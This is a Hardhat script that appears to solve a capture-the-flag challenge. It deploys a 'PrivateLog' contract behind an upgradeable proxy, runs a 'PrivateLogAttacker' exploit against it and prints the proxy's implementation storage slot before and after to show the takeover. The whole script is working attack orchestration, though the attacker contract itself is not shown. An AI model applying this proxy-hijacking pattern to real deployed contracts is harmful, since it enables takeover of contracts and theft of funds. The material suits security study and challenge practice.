const { ethers } = require('hardhat');

async function main() {
  const [attackerAcc, deployer] = await ethers.getSigners();
  
  console.log("Beginning setup...");
  const PrivateLog = await ethers.getContractFactory("PrivateLog", deployer);
  console.log("Deploying PrivateLog...");
  const privateLog = await PrivateLog.deploy();
  await privateLog.deployed();
  console.log("privateLog deployed to:", privateLog.address);

  const Attacker = await ethers.getContractFactory("PrivateLogAttacker");
  console.log("Deploying Attacker...");
  const attacker = await Attacker.deploy();
  await attacker.deployed();
  console.log("attacker deployed to:", attacker.address);

  const Proxy = await ethers.getContractFactory("TransparentUpgradeableProxy");
  console.log("Deploying TransparentUpgradeableProxy...");
  let proxy = await Proxy.deploy(privateLog.address, deployer.address, await attacker.getSampleInitializerData());
  await proxy.deployed();
  console.log("proxy deployed to:", proxy.address);
  proxy = await ethers.getContractAt("PrivateLog", proxy.address);

  const passwordHash = await attacker.getSamplePasswordHash("yakuhito");
  console.log("proxy secret hash: " + await proxy.secretHash());
  console.log("expected secret hash: " + passwordHash);
  console.log("Setup complete.");
  console.log("--");

  const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  // ---------------------------------------------------------------------------------------------------------------

  await proxy.createLogEntry("yakuhitooo", "yakuhito", passwordHash);
  console.log(await proxy.viewLog(0));
  console.log(await ethers.provider.getStorageAt(proxy.address, IMPLEMENTATION_SLOT));
  await attacker.exploit(proxy.address, "yakuhito");
  console.log(await ethers.provider.getStorageAt(proxy.address, IMPLEMENTATION_SLOT));
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
